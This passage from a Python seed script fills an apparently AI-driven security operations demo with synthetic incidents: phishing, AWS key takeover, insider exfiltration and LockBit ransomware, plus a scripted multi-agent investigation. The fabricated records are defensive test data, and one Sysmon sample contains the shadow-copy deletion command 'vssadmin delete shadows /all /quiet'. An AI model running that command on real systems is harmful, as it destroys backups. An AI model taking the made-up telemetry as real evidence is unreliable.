) -> Case:
    techniques = [{"id": tid, "name": _TECHNIQUE_NAMES.get(tid, tid)} for tid in incident["technique_ids"]]
    tactics = [{"id": tid, "name": _TACTIC_NAMES.get(tid, tid)} for tid in incident["tactic_ids"]]
    closed_at = when + timedelta(hours=4) if incident["status"] in ("resolved", "closed") else None

    return Case(
        tenant_id=tenant_id,
        case_number=incident["key"],
        title=incident["title"],
        description=incident["description"],
        status=incident["status"],
        priority=incident["severity"],
        severity=incident["severity"],
        case_type="security_incident",
        mitre_tactics=tactics,
        mitre_techniques=techniques,
        alert_ids=[str(a) for a in alert_ids],
        tags=["realistic", incident["severity"], *incident["tags"]],
        summary=(
            f"Realistic-incident showcase {incident['key']}. "
            f"host={incident['host']} user={incident['user']} src_ip={incident['src_ip']} "
            f"techniques={','.join(incident['technique_ids'])}"
        ),
        created_at=when,
        updated_at=when,
        closed_at=closed_at,
    )


def _serialize_playbook_run(
    incident: dict,
    *,
    case_id: uuid.UUID,
    when: datetime,
) -> dict:
    """Build a serialised PlaybookRun-shaped dict for embedding in CaseTimeline.

    Mirrors the structure returned by `PlaybookEngine.PlaybookRun.to_dict()`
    in `services/agents/app/playbook/engine.py`. We keep it ORM-free because
    PlaybookRun is an in-process object with no persistent table; embedding
    the serialised state in `CaseTimeline.event_metadata` is the cleanest way
    to populate "playbook history" in the demo without inventing a schema.
    """
    spec = incident["playbook_run"]
    run_id = str(uuid.uuid4())
    started_at = when - timedelta(minutes=12)
    completed_at = when - timedelta(minutes=1) if spec["status"] == "completed" else None

    step_results: list[dict] = []
    cursor = started_at
    for step_id, name, status, output in spec["steps"]:
        cursor = cursor + timedelta(seconds=_rng.randint(15, 120))
        finished = cursor + timedelta(milliseconds=output.get("duration_ms", 4_000)) if status == "completed" else None
        step_results.append(
            {
                "step_id": step_id,
                "name": name,
                "status": status,
                "started_at": cursor.isoformat() if status != "pending" else None,
                "completed_at": finished.isoformat() if finished else None,
                "output": output,
                "attempts": 1 if status != "pending" else 0,
            }
        )
        if status == "completed" and finished:
            cursor = finished

    return {
        "run_id": run_id,
        "playbook_id": spec["playbook_id"],
        "playbook_name": spec["playbook_name"],
        "case_id": str(case_id),
        "incident_key": incident["key"],
        "status": spec["status"],
        "context": spec.get("context", {}),
        "started_at": started_at.isoformat(),
        "completed_at": completed_at.isoformat() if completed_at else None,
        "step_results": step_results,
        "summary": {
            "total": len(step_results),
            "completed": sum(1 for s in step_results if s["status"] == "completed"),
            "running": sum(1 for s in step_results if s["status"] == "running"),
            "pending": sum(1 for s in step_results if s["status"] == "pending"),
        },
    }


async def _seed_realistic_incidents(session, tenant: Tenant) -> tuple[int, int, int]:
    """Seed the 15 BOTS-shaped realistic incidents.

    Returns ``(alerts, cases, playbook_runs)``. Idempotent: short-circuits if
    any case with an ``INC-RT-`` prefix is already present.
    """
    existing = await session.execute(select(Case).where(Case.tenant_id == tenant.id).where(Case.case_number.like("INC-RT-%")).limit(1))
    if existing.scalar_one_or_none() is not None:
        return 0, 0, 0

    now = datetime.now(UTC)
    new_alerts: list[Alert] = []
    new_cases: list[Case] = []
    timeline_rows: list[CaseTimeline] = []
    playbook_run_count = 0

    # Spread incidents across the last 14 days, keeping the in-flight one
    # very recent so it shows up at the top of the queue.
    for _index, incident in enumerate(_REALISTIC_INCIDENTS):
        is_in_flight = bool(incident.get("in_flight_investigation"))
        offset_minutes = 8 if is_in_flight else _rng.randint(60, 60 * 24 * 13)
        case_when = now - timedelta(minutes=offset_minutes)

        # Build alerts for this incident.
        incident_alerts: list[Alert] = []
        for alert_offset, alert_spec in enumerate(incident["alerts"]):
            alert_when = case_when + timedelta(minutes=alert_offset * 2 - 3)
            alert = _make_realistic_alert(
                tenant.id,
                incident,
                alert_spec,
                when=alert_when,
                case_status=incident["status"],
            )
            incident_alerts.append(alert)
        session.add_all(incident_alerts)
        await session.flush()  # populate Alert.id for the case linkage
        new_alerts.extend(incident_alerts)

        # Build the case + link alerts.
        case = _make_realistic_case(
            tenant.id,
            incident,
            when=case_when,
            alert_ids=[a.id for a in incident_alerts],
        )
        session.add(case)
        await session.flush()
        new_cases.append(case)

        # Backfill case_id on the alerts so the join works in the console.
        for alert in incident_alerts:
            alert.case_id = case.id

        # Always emit a "case opened" timeline entry; embed the playbook run
        # if present.
        timeline_rows.append(
            CaseTimeline(
                case_id=case.id,
                tenant_id=case.tenant_id,
                event_type="created",
                content=f"Case opened from {len(incident_alerts)} correlated alert(s).",
                event_metadata={
                    "actor": "alert-fusion",
                    "incident_key": incident["key"],
                    "alerts": [str(a.id) for a in incident_alerts],
                },
                is_automated=True,
                created_at=case_when,
            )
        )

        if "playbook_run" in incident:
            playbook_run = _serialize_playbook_run(incident, case_id=case.id, when=case_when)
            timeline_rows.append(
                CaseTimeline(
                    case_id=case.id,
                    tenant_id=case.tenant_id,
                    event_type="playbook_run",
                    content=(
                        f"Playbook `{playbook_run['playbook_name']}` "
                        f"({playbook_run['summary']['completed']}/"
                        f"{playbook_run['summary']['total']} steps complete) "
                        f"— status: {playbook_run['status']}."
                    ),
                    event_metadata={
                        "actor": "playbook-engine",
                        "playbook_run": playbook_run,
                    },
                    is_automated=True,
                    created_at=case_when + timedelta(minutes=2),
                )
            )
            playbook_run_count += 1

    session.add_all(timeline_rows)
    await session.flush()

    return len(new_alerts), len(new_cases), playbook_run_count


async def _seed_in_flight_investigation(session, tenant: Tenant) -> int:
    """Seed the in-flight ransomware investigation for INC-RT-001.

    Mirrors the LangGraph investigator state machine: a Recon → Forensic →
    Responder progression with one terminal evidence-citation event.
    Idempotent: short-circuits if a run already exists for this case_id.
    """
    incident = next(
        (i for i in _REALISTIC_INCIDENTS if i.get("in_flight_investigation")),
        None,
    )
    if incident is None:
        return 0

    existing = await session.execute(
        select(InvestigationRun).where(InvestigationRun.tenant_id == tenant.id).where(InvestigationRun.case_id == incident["key"]).limit(1)
    )
    if existing.scalar_one_or_none() is not None:
        return 0

    started = datetime.now(UTC) - timedelta(minutes=6)

    run = InvestigationRun(
        tenant_id=tenant.id,
        case_id=incident["key"],
        alert_summary=incident["title"],
        raw_alert={
            "incident_key": incident["key"],
            "host": incident["host"],
            "user": incident["user"],
            "src_ip": incident["src_ip"],
            "techniques": incident["technique_ids"],
        },
        model_used="aisoc-investigator-v1",
        status="running",
        started_at=started,
    )
    session.add(run)
    await session.flush()

    # `kind` values mirror StepKind in services/agents/app/investigator/state.py.
    events_spec: list[tuple[str, str, str, dict]] = [
        (
            "recon",
            "ReconAgent",
            "Enumerated active processes on WIN-FIN-DB01; flagged vssadmin.exe spawned by cmd.exe under SYSTEM.",
            {
                "tool": "edr.process_tree",
                "host": incident["host"],
                "anomalies": [
                    {"image": "vssadmin.exe", "parent": "cmd.exe", "user": "NT AUTHORITY\\SYSTEM"},
                    {"image": "lockbit.exe", "parent": "explorer.exe", "user": "svc-backup"},
                ],
            },
        ),
        (
            "tool_call",
            "ReconAgent",
            "Pulled CrowdStrike detection details for ldt:abc123:lockbit-encrypt.",
            {
                "tool": "crowdstrike.detection",
                "detect_id": "ldt:abc123:lockbit-encrypt",
                "files_modified": 12384,
                "extension_written": ".lockbit",
            },
        ),
        (
            "forensic",
            "ForensicAgent",
            "Identified ransom-note artefact `RESTORE-MY-FILES.txt` on C:\\, D:\\, E:\\; computed SHA-256.",
            {
                "tool": "edr.file_search",
                "host": incident["host"],
                "matches": [
                    {"path": "C:\\Users\\Public\\RESTORE-MY-FILES.txt", "sha256": "ab12…f9"},
                    {"path": "D:\\BACKUP\\RESTORE-MY-FILES.txt", "sha256": "ab12…f9"},
                ],
            },
        ),
        (
            "evidence_cited",
            "ForensicAgent",
            "Cited Sysmon EID 1 (vssadmin) and CrowdStrike encryption-pattern detection as primary evidence.",
            {
                "evidence": [
                    {"source": "Sysmon", "event_id": 1, "process": "vssadmin.exe"},
                    {"source": "CrowdStrike Falcon", "detect_id": "ldt:abc123:lockbit-encrypt"},
                ],
            },
        ),
        (
            "decision_reason",
            "ResponderAgent",
            (
                "Confidence 0.96 that this is LockBit 3.0 (encryption pattern + shadow-copy "
                "deletion + lateral SMB to FIN-DB02). Recommend immediate isolation and credential rotation."
            ),
            {
                "confidence": 0.96,
                "techniques": ["T1486", "T1490", "T1021.002"],
                "recommended_actions": [
                    "endpoint.isolate",
                    "endpoint.kill_process:lockbit.exe",
                    "identity.rotate_credentials:svc-backup",
                ],
            },
        ),
        (
            "responder",
            "ResponderAgent",
            "Triggered CrowdStrike RTR network-contain on WIN-FIN-DB01.",
            {
                "tool": "crowdstrike.rtr.contain",
                "host": incident["host"],
                "result": "contained",
                "duration_ms": 4_120,
            },
        ),
        (
            "responder",
            "ResponderAgent",
            "Currently terminating `lockbit.exe` on host (process kill in flight).",
            {
                "tool": "endpoint.kill_process",
                "process_name": "lockbit.exe",
                "status": "running",
            },
        ),
    ]

    events: list[InvestigationEvent] = []
    artifacts: list[InvestigationArtifact] = []
    for seq, (kind, agent, summary, payload) in enumerate(events_spec, start=1):
        ts = started + timedelta(seconds=seq * 18 + _rng.randint(0, 8))
        ev = InvestigationEvent(
            run_id=run.id,
            tenant_id=tenant.id,
            seq=seq,
            ts=ts,
            kind=kind,
            agent=agent,
            summary=summary,
            payload=payload,
        )
        events.append(ev)
    session.add_all(events)
    await session.flush()

    # One artifact per major finding so the timeline UI has clickable items.
    artifact_specs = [
        ("ioc", events[1], "ldt:abc123:lockbit-encrypt"),
        ("file_hash", events[2], "ab12cd34ef56…f9 (RESTORE-MY-FILES.txt)"),
        ("recommendation", events[4], "Isolate WIN-FIN-DB01 and rotate svc-backup credentials"),
    ]
    for kind, ev, content in artifact_specs:
        encoded = content.encode("utf-8")
        artifacts.append(
            InvestigationArtifact(
                run_id=run.id,
                event_id=ev.id,
                tenant_id=tenant.id,
                kind=kind,
                content=content,
                sha256=hashlib.sha256(encoded).hexdigest(),
                size_bytes=len(encoded),
            )
        )
    session.add_all(artifacts)
    await session.flush()

    return 1


async def _seed_alerts_and_cases(session, tenant: Tenant, *, alert_count: int = 120) -> tuple[int, int]:
    existing = await session.execute(select(Alert).where(Alert.tenant_id == tenant.id).limit(1))
    if existing.scalar_one_or_none() is not None:
        return 0, 0

    now = datetime.now(UTC)
    alerts: list[Alert] = []
    for _ in range(alert_count):
        when = now - timedelta(minutes=_rng.randint(1, 60 * 24 * 14))
        alerts.append(_make_alert(tenant.id, when))
    session.add_all(alerts)
    await session.flush()

    cases: list[Case] = []
    timeline_rows: list[CaseTimeline] = []
    task_rows: list[CaseTask] = []

    # 8 generic cases (legacy)
    for i in range(8):
        when = now - timedelta(hours=_rng.randint(1, 240))
        related = _rng.sample(alerts, k=_rng.randint(2, 6))
        case = _make_case(tenant.id, i, when, [a.id for a in related])
        cases.append(case)

    # 20 synthetic incidents with rich MITRE metadata for p1-eval
    for i in range(20):
        when = now - timedelta(hours=_rng.randint(1, 480))
        related = _rng.sample(alerts, k=_rng.randint(1, 4))
        case = _make_synthetic_case(tenant.id, i, when, [a.id for a in related])
        cases.append(case)

    session.add_all(cases)
    await session.flush()

    # Light timeline + task per case
    for case in cases:
        timeline_rows.append(
            CaseTimeline(
                case_id=case.id,
                tenant_id=case.tenant_id,
                event_type="created",
                content="Case opened by AI alert fusion service.",
                event_metadata={"actor": "system", "alerts": case.alert_ids},
                is_automated=True,
                created_at=case.created_at,
            )
        )
        task_rows.append(
            CaseTask(
                case_id=case.id,
                tenant_id=case.tenant_id,
                title="Triage and contain",
                description="Confirm scope, isolate affected hosts, capture artifacts.",
                status="pending",
                created_at=case.created_at,
            )
        )
    session.add_all(timeline_rows)
    session.add_all(task_rows)
    await session.flush()

    return len(alerts), len(cases)


# Map ORM Case.status → aisoc_cases.status (migration 012 CHECK constraint).
_AISOC_STATUS_MAP = {
    "open": "new",
    "new": "new",
    "triaged": "triaged",
    "pending": "triaged",
    "in_progress": "investigating",
    "investigating": "investigating",
    "contained": "contained",
    "resolved": "resolved",
    "closed": "closed",
    "false_positive": "closed",
}

# Map ORM severity → aisoc_cases.severity (migration 012 CHECK constraint).
_AISOC_SEVERITY_MAP = {
    "critical": "critical",
    "high": "high",
    "medium": "medium",
    "low": "low",
    "info": "info",
}


async def _mirror_cases_to_aisoc(session, tenant: Tenant) -> int:
    """Mirror ORM ``cases`` rows into the raw-SQL ``aisoc_cases`` table.

    The HTTP API (``/api/v1/cases``) reads from ``aisoc_cases`` (created by
    migration 012) while the ORM ``Case`` model writes to ``cases``. The two
    were originally separate features that never got reconciled; this helper
    keeps the demo dataset visible to the console without forcing a schema
    migration.

    Idempotent: ``ON CONFLICT (id) DO NOTHING`` so re-runs are no-ops.
    """
    rows = (await session.execute(select(Case).where(Case.tenant_id == tenant.id))).scalars().all()
    if not rows:
        return 0

    inserted = 0
    for c in rows:
        params = {
            "id": str(c.id),
            "tenant_id": str(c.tenant_id),
            "case_number": c.case_number,
            "title": c.title,
            "description": c.description or c.summary or "",
            "severity": _AISOC_SEVERITY_MAP.get(c.severity, "medium"),
            "status": _AISOC_STATUS_MAP.get(c.status, "new"),
            "assignee": str(c.assigned_to_id) if c.assigned_to_id else None,
            "mitre_techniques": _json_dumps(c.mitre_techniques or []),
            "alert_ids": [str(a) for a in (c.alert_ids or [])],
            "tags": _json_dumps(_tags_to_object(c.tags)),
            "opened_at": c.created_at,
            "resolved_at": c.closed_at,
            "closed_at": c.closed_at,
            "created_at": c.created_at,
            "updated_at": c.updated_at,
            "created_by": "seed",
        }
        result = await session.execute(
            text(
                """
                INSERT INTO aisoc_cases (
                    id, tenant_id, case_number,
                    title, description, severity, status,
                    assignee, mitre_techniques, alert_ids,
                    opened_at, resolved_at, closed_at,
                    created_at, updated_at, created_by, tags
                ) VALUES (
                    CAST(:id AS UUID), CAST(:tenant_id AS UUID), :case_number,
                    :title, :description, :severity, :status,
                    :assignee, CAST(:mitre_techniques AS JSONB),
                    CAST(:alert_ids AS UUID[]),
                    :opened_at, :resolved_at, :closed_at,
                    :created_at, :updated_at, :created_by,
                    CAST(:tags AS JSONB)
                )
                ON CONFLICT (id) DO UPDATE SET case_number = EXCLUDED.case_number
                """
            ).bindparams(**params)
        )
        inserted += result.rowcount or 0
    return inserted


def _json_dumps(value) -> str:
    import json

    return json.dumps(value, default=str)


def _tags_to_object(tags) -> dict:
    """ORM stores tags as a list[str]; aisoc_cases.tags is JSONB object."""
    if isinstance(tags, dict):
        return tags
    if isinstance(tags, list):
        return {"labels": [str(t) for t in tags]}
    return {}


# ─── T6.4 quick-seed (`--demo-quick`) ─────────────────────────────────────────
#
# Four deterministic DEMO-* cases, byte-stable IDs and timestamps, finishes
# in under four minutes on a warm laptop. The screencast / hosted-demo path.

# Anchored at the T6.4 screencast clock so re-runs produce the same
# `created_at` timestamps. Overridable from the CLI via `--clock <iso>` —
# in practice nobody touches it; it exists so the test suite and any
# future regen-fixtures script can pin the clock without env vars.
_DEMO_QUICK_DEFAULT_CLOCK_ISO = "2026-05-13T19:00:00+00:00"

# Namespace UUID used by `_demo_quick_uuid` so case/alert IDs are stable
# across machines (uuid5 is deterministic given the same namespace + name).
# The constant has no security meaning — it's just a fixed seed.
_DEMO_QUICK_UUID_NS = uuid.UUID("a15a1c00-0000-4d04-8000-000000000064")


def _parse_clock(value: str | None) -> datetime:
    """Parse the `--clock` argument (ISO-8601) into a UTC-aware datetime.

    Defaults to ``_DEMO_QUICK_DEFAULT_CLOCK_ISO`` so re-runs are byte-stable.
    Naive datetimes are interpreted as UTC.
    """
    if value is None:
        value = _DEMO_QUICK_DEFAULT_CLOCK_ISO
    # Python 3.11+ accepts trailing "Z" via fromisoformat, but be defensive.
    raw = value.replace("Z", "+00:00")
    try:
        dt = datetime.fromisoformat(raw)
    except ValueError as exc:
        raise SystemExit(f"--clock must be an ISO-8601 timestamp, got {value!r}: {exc}") from exc
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=UTC)
    return dt.astimezone(UTC)


def _demo_quick_uuid(*parts: str) -> uuid.UUID:
    """Deterministic UUID for a (case_key, ...) tuple.

    Example: `_demo_quick_uuid("DEMO-001", "case")` always returns the same
    UUID, so the case ID is byte-stable across reseeds / machines. We use
    uuid5 with a fixed namespace rather than uuid4 so the screencast and
    docs can refer to specific UUIDs without lying.
    """
    return uuid.uuid5(_DEMO_QUICK_UUID_NS, "/".join(parts))


# The four canonical demo cases. Each entry is consumed by
# `_seed_demo_quick` below — kept as a module-level constant so the
# lightweight unit test in `services/api/tests/test_demo_seed.py` can
# introspect it without touching the database.
_DEMO_QUICK_INCIDENTS: list[dict] = [
    {
        "key": "DEMO-001",
        "title": "Spear-phish + credential harvest of alice@example.com (M365)",
        "description": (
            "Targeted spear-phishing email impersonating the CFO led "
            "`alice@example.com` to a counterfeit Microsoft 365 login page. "
            "Email gateway flagged the lure 9 minutes before sign-in; M365 "
            "then recorded a successful login from a new ASN (185.199.108.153, "
            "GitHub Pages — typical phishing-kit host) followed by a "
            "forwarding rule that hides external mail."
        ),
        "severity": "high",
        "status": "in_progress",
        "host": "MAC-ALICE-LT",
        "user": "alice@example.com",
        "src_ip": "185.199.108.153",
        "tactic_ids": ["TA0001", "TA0006"],
        "technique_ids": ["T1566.002", "T1078.004"],
        "tags": ["phishing", "credential-harvest", "m365", "demo"],
        # Connector source labels — what the buyer sees in the Source column.
        # Kept as a list because some incidents fuse two connector feeds.
        "connector_sources": ["o365", "email-inbox"],
        "alerts": [
            {
                "title": "Email gateway: spear-phish lure to alice@example.com (CFO impersonation)",
                "severity": "high",
                "source": "Email inbox",
                "connector_type": "email-inbox",
                "category": "saas",
                "sourcetype": "email_inbox:message",
                "process": "outlook.exe",
                "ai_score": 0.94,
                "extra": {
                    "from_display": "CFO — Treasury Update",
                    "from_email": "cfo-treasury@gnail-acme.com",
                    "reply_to": "treasury-update@gnail-acme.com",
                    "subject": "Updated wire instructions — Q2 vendor file",
                    "link_count": 1,
                    "link_target": "https://acme-portal.cf-pages.io/m365",
                    "headers": {
                        "Authentication-Results": "spf=fail dkim=none dmarc=fail",
                        "Received-SPF": "fail (gnail-acme.com)",
                    },
                    "dlp_classification": "spearphishing-link",
                },
            },
            {
                "title": "M365: successful sign-in for alice@example.com from new ASN (185.199.108.0/22)",
                "severity": "high",
                "source": "Microsoft 365",
                "connector_type": "o365",
                "category": "saas",
                "sourcetype": "o365:management:activity",
                "process": "AzureActiveDirectory",
                "ai_score": 0.91,
                "extra": {
                    "Operation": "UserLoggedIn",
                    "ResultStatus": "Success",
                    "UserId": "alice@example.com",
                    "ClientIP": "185.199.108.153",
                    "DeviceProperties": [
                        {"Name": "OS", "Value": "Windows 11"},
                        {"Name": "BrowserType", "Value": "Edge"},
                        {"Name": "TrustType", "Value": "Unmanaged"},
                    ],
                    "ASN": "AS54113 Fastly",
                    "RiskLevelAggregated": "high",
                    "RiskEventTypes": ["unfamiliarFeatures", "newAsn"],
                },
            },
            {
                "title": "M365: New-InboxRule auto-forwards CFO threads externally — alice@example.com",
                "severity": "high",
                "source": "Microsoft 365",
                "connector_type": "o365",
                "category": "saas",
                "sourcetype": "o365:management:activity",
                "process": "Exchange",
                "ai_score": 0.88,
                "extra": {
                    "Operation": "New-InboxRule",
                    "Parameters": [
                        {"Name": "From", "Value": "cfo@example.com"},
                        {"Name": "ForwardTo", "Value": "treasury-update@gnail-acme.com"},
                        {"Name": "DeleteMessage", "Value": "True"},
                    ],
                    "UserId": "alice@example.com",
                    "ClientIP": "185.199.108.153",
                },
            },
        ],
    },
    {
        "key": "DEMO-002",
        "title": "AWS cloud takeover: stolen IAM key → AssumeRole → S3 enumeration",
        "description": (
            "GuardDuty flagged `UnauthorizedAccess:IAMUser/MaliciousIPCaller` "
            "against the long-lived `build-runner` access key. CloudTrail "
            "shows the actor immediately calling `sts:AssumeRole` into the "
            "`prod-readonly` role and then enumerating + downloading objects "
            "from `corp-hr-backups`. Key has not yet been disabled."
        ),
        "severity": "critical",
        "status": "in_progress",
        "host": "ec2-build-worker-09",
        "user": "iam-user/build-runner",
        "src_ip": "104.244.42.193",
        "tactic_ids": ["TA0001", "TA0006", "TA0009"],
        "technique_ids": ["T1078.004", "T1530", "T1567.002"],
        "tags": ["aws", "cloud-takeover", "iam", "s3", "demo"],
        "connector_sources": ["aws-cloudtrail", "aws-guardduty"],
        "alerts": [
            {
                "title": "GuardDuty: UnauthorizedAccess:IAMUser/MaliciousIPCaller — build-runner from 104.244.42.193",
                "severity": "high",
                "source": "AWS GuardDuty",
                "connector_type": "aws-guardduty",
                "category": "cloud",
                "sourcetype": "aws:guardduty",
                "process": "guardduty.finding",
                "ai_score": 0.93,
                "extra": {
                    "type": "UnauthorizedAccess:IAMUser/MaliciousIPCaller",
                    "severity": 8,
                    "resource": {"accessKeyDetails": {"userName": "build-runner"}},
                    "service": {"action": {"awsApiCallAction": {"api": "GetCallerIdentity"}}},
                    "remoteIpDetails": {
                        "ipAddressV4": "104.244.42.193",
                        "country": {"countryName": "Romania"},
                    },
                },
            },
            {
                "title": "CloudTrail: sts:AssumeRole into prod-readonly from build-runner",
                "severity": "critical",
                "source": "AWS CloudTrail",
                "connector_type": "aws-cloudtrail",
                "category": "cloud",
                "sourcetype": "aws:cloudtrail",
                "process": "sts.amazonaws.com",
                "ai_score": 0.95,
                "extra": {
                    "eventName": "AssumeRole",
                    "eventSource": "sts.amazonaws.com",
                    "userIdentity": {
                        "type": "IAMUser",
                        "userName": "build-runner",
                        "accessKeyId": "AKIA****REDACTED",
                    },
                    "sourceIPAddress": "104.244.42.193",
                    "requestParameters": {
                        "roleArn": "arn:aws:iam::123456789012:role/prod-readonly",
                        "roleSessionName": "build-runner-session",
                    },
                    "errorCode": None,
                },
            },
            {
                "title": "CloudTrail: GetObject burst from prod-readonly session — corp-hr-backups (312 keys/5m)",
                "severity": "high",
                "source": "AWS CloudTrail",
                "connector_type": "aws-cloudtrail",
                "category": "cloud",
                "sourcetype": "aws:cloudtrail",
                "process": "s3.amazonaws.com",
                "ai_score": 0.89,
                "extra": {
                    "eventName": "GetObject",
                    "eventSource": "s3.amazonaws.com",
                    "userIdentity": {
                        "type": "AssumedRole",
                        "sessionContext": {
                            "sessionIssuer": {"userName": "prod-readonly"},
                        },
                    },
                    "sourceIPAddress": "104.244.42.193",
                    "requestParameters": {"bucketName": "corp-hr-backups"},
                    "object_count_5min": 312,
                },
            },
        ],
    },
    {
        "key": "DEMO-003",
        "title": "Insider exfil: leaving employee bulk-pulls Confluence + uploads to personal Drive",
        "description": (
            "Within their 2-week notice period, `dave@example.com` exported "
            "240 sensitive Confluence pages from the `M&A` and `HR-PII` "
            "spaces in 14 minutes — far outside their baseline. Google "
            "Workspace then logged a 12 GB upload to a personal Drive "
            "account. DLP egress proxy blocked the second batch."
        ),
        "severity": "high",
        "status": "in_progress",
        "host": "WIN-HR-DESKTOP",
        "user": "dave@example.com",
        "src_ip": "10.42.7.119",
        "tactic_ids": ["TA0009", "TA0010"],
        "technique_ids": ["T1213.001", "T1567.002"],
        "tags": ["insider", "exfiltration", "confluence", "google-workspace", "demo"],
        "connector_sources": ["confluence-audit", "google-workspace"],
        "alerts": [
            {
                "title": "Confluence: 240 sensitive pages viewed by dave@example.com in 14 minutes (M&A, HR-PII)",
                "severity": "high",
                "source": "Atlassian Confluence",
                "connector_type": "confluence-audit",
                "category": "saas",
                "sourcetype": "confluence:audit",
                "process": "confluence",
                "ai_score": 0.87,
                "extra": {
                    "actor": {"accountId": "5b10ac8d82e05b22cc7d4ef5", "displayName": "Dave Eaves"},
                    "summary": "bulk page view burst",
                    "objectItem": {"typeName": "PAGE"},
                    "spaces": ["M&A", "HR-PII"],
                    "events": [
                        {"action": "page_viewed", "count": 240, "window_seconds": 840},
                    ],
                    "user_notice_period": True,
                    "baseline_pages_per_hour": 4,
                },
            },
            {
                "title": "Confluence: bulk PDF export of 240 pages by dave@example.com",
                "severity": "high",
                "source": "Atlassian Confluence",
                "connector_type": "confluence-audit",
                "category": "saas",
                "sourcetype": "confluence:audit",
                "process": "confluence",
                "ai_score": 0.92,
                "extra": {
                    "actor": {"accountId": "5b10ac8d82e05b22cc7d4ef5"},
                    "summary": "pages exported as PDF",
                    "objectItem": {"typeName": "PAGE"},
                    "events": [
                        {"action": "page_exported", "format": "pdf", "count": 240},
                    ],
                },
            },
            {
                "title": "Google Workspace: 12 GB upload to personal Drive — drive.google.com/u/1/",
                "severity": "high",
                "source": "Google Workspace",
                "connector_type": "google-workspace",
                "category": "saas",
                "sourcetype": "google_workspace:drive",
                "process": "chrome.exe",
                "ai_score": 0.90,
                "extra": {
                    "actor": {"email": "dave@example.com"},
                    "events": [
                        {
                            "name": "upload",
                            "parameters": [
                                {"name": "doc_title", "value": "Q1-MnA-export.zip"},
                                {"name": "owner_is_team_drive", "boolValue": False},
                                {"name": "destination", "value": "personal:dave.eaves83@gmail.com"},
                                {"name": "bytes", "intValue": 12_582_912_000},
                            ],
                        }
                    ],
                    "ipAddress": "10.42.7.119",
                },
            },
        ],
    },
    {
        "key": "DEMO-004",
        "title": "Ransomware: LockBit 3.0 encryption pattern + ransom note on WIN-FIN-DB01",
        "description": (
            "CrowdStrike + SentinelOne telemetry agree: ~12k files renamed to "
            "`.lockbit`, shadow copies wiped via `vssadmin`, and a "
            "`RESTORE-MY-FILES.txt` ransom note dropped on every drive. "
            "Host is being isolated; rotation of `svc-backup` credentials "
            "is queued."
        ),
        "severity": "critical",
        "status": "in_progress",
        "host": "WIN-FIN-DB01",
        "user": "svc-backup@example.com",
        "src_ip": "10.42.1.87",
        "tactic_ids": ["TA0002", "TA0005", "TA0040"],
        "technique_ids": ["T1059.001", "T1490", "T1486"],
        "tags": ["ransomware", "lockbit", "demo", "showcase"],
        "connector_sources": ["crowdstrike", "sentinelone"],
        "alerts": [
            {
                "title": "CrowdStrike: high-volume file modification pattern on WIN-FIN-DB01",
                "severity": "critical",
                "source": "CrowdStrike Falcon",
                "connector_type": "crowdstrike",
                "category": "edr",
                "sourcetype": "crowdstrike:falcon:json",
                "process": "explorer.exe",
                "ai_score": 0.97,
                "extra": {
                    "DetectId": "ldt:demo004:lockbit-encrypt",
                    "PatternDispositionDescription": "Prevention, process killed.",
                    "Severity": 5,
                    "Tactic": "Impact",
                    "Technique": "Data Encrypted for Impact",
                    "FilesModified": 12384,
                    "FileExtensionWritten": ".lockbit",
                    "ComputerName": "WIN-FIN-DB01",
                    "UserName": "svc-backup",
                },
            },
            {
                "title": "SentinelOne: ransom note RESTORE-MY-FILES.txt dropped across C:, D:, E:",
                "severity": "critical",
                "source": "SentinelOne",
                "connector_type": "sentinelone",
                "category": "edr",
                "sourcetype": "sentinelone:threat",
                "process": "lockbit.exe",
                "ai_score": 0.95,
                "extra": {
                    "threatInfo": {
                        "classification": "Ransomware",
                        "classificationSource": "Engine",
                        "threatName": "LockBit 3.0",
                        "engines": ["Behavioral", "DFI"],
                    },
                    "agentRealtimeInfo": {
                        "agentComputerName": "WIN-FIN-DB01",
                        "agentOsName": "Windows Server 2022",
                    },
                    "indicators": [
                        {"category": "ransomNote", "description": "RESTORE-MY-FILES.txt on root of C:, D:, E:"},
                        {"category": "extensionRename", "description": "12,384 files renamed to .lockbit"},
                    ],
                },
            },
            {
                "title": "Sysmon: vssadmin shadow-copy deletion on WIN-FIN-DB01 (T1490)",
                "severity": "critical",
                "source": "CrowdStrike Falcon",
                "connector_type": "crowdstrike",
                "category": "edr",
                "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
                "process": "vssadmin.exe",
                "ai_score": 0.94,
                "extra": {
                    "EventID": 1,
                    "ProcessId": 4892,
                    "ParentImage": r"C:\\Windows\\System32\\cmd.exe",
                    "Image": r"C:\\Windows\\System32\\vssadmin.exe",
                    "CommandLine": "vssadmin delete shadows /all /quiet",
                    "User": "NT AUTHORITY\\\\SYSTEM",
                    "IntegrityLevel": "System",
                    "Hashes": "SHA256=4DA1F312A214C07143ABEEAFB695D904",
                },
            },
        ],
    },
]


def _demo_quick_make_alert(
    tenant_id: uuid.UUID,
    incident: dict,
    alert_index: int,
    alert_spec: dict,
    *,
    when: datetime,
) -> Alert:
    """Construct an Alert for a quick-mode incident with deterministic IDs."""
    severity = alert_spec["severity"]
    priority = {"critical": 92, "high": 78, "medium": 55, "low": 28}[severity]
    techniques = [{"id": tid, "name": _TECHNIQUE_NAMES.get(tid, tid)} for tid in incident["technique_ids"]]
    tactics = [{"id": tid, "name": _TACTIC_NAMES.get(tid, tid)} for tid in incident["tactic_ids"]]

    raw_event = _bots_raw_event(
        when,
        source=alert_spec["source"],
        sourcetype=alert_spec["sourcetype"],
        host=incident["host"],
        user=incident["user"],
        src_ip=incident["src_ip"],
        process=alert_spec.get("process"),
        extra=alert_spec.get("extra", {}),
    )
    # Pin the BOTS-shaped event id to a deterministic uuid5 so the raw
    # payload re-renders identically across reseeds. The default
    # `_bots_raw_event` helper uses uuid4 which would break byte-stability.
    raw_event["_event_id"] = str(_demo_quick_uuid(incident["key"], "alert", str(alert_index), "event"))

    return Alert(
        id=_demo_quick_uuid(incident["key"], "alert", str(alert_index)),
        tenant_id=tenant_id,
        title=alert_spec["title"],
        description=(f"{alert_spec['source']} detection. {incident['description']}"),
        severity=severity,
        status=_alert_status_for_case(incident["status"]),
        priority=priority,
        category=alert_spec.get("category", "siem"),
        mitre_tactics=tactics,
        mitre_techniques=techniques,
        connector_type=alert_spec["connector_type"],
        ai_score=alert_spec.get("ai_score", 0.85),
        ai_summary=(
            f"AI assessed this {severity} alert as part of demo incident "
            f"{incident['key']} ({incident['title']}). "
            f"Primary technique: {techniques[0]['name']} ({techniques[0]['id']})."
        ),
        ai_recommendations=[
            f"Investigate host {incident['host']}",
            f"Review activity for {incident['user']}",
